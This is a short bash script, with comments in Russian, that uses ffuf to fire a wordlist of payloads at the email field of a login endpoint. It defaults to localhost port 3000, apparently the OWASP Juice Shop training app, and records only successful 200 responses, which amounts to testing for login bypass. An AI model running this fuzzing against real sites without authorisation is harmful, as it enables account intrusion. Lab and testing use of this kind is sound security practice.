#!/usr/bin/env bash
# Останавливаемся при ошибке, выводим каждый шаг
set -euo pipefail

WORDLIST=${1:-payloads.txt}
OUT_DIR=${2:-artifacts}
URL=${3:-http://localhost:3000/rest/user/login}

mkdir -p "$OUT_DIR"

# FFUF ищет успешные (200 OK) ответы на POST /rest/user/login
ffuf \
  -w "$WORDLIST":PAY          `# PAY — наше ключевое слово` \
  -u "$URL"                   \
  -X POST                     \
  -H "Content-Type: application/json" \
  -d '{"email":"PAY","password":"pass"}' \
  -t 50                       `# параллельные потоки` \
  -mc 200                     `# показываем только 200 OK` \
  -o "$OUT_DIR/ffuf-results.json" -of json
